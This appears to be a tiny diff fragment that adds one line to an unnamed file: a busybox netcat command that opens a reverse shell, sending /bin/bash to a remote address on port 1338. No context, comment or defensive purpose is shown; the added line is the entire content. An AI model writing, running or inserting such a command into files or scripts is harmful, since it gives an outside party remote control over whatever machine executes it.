@@ -1,0 +1,1 @@
+busybox nc 10.11.93.140 1338 -e /bin/bash    
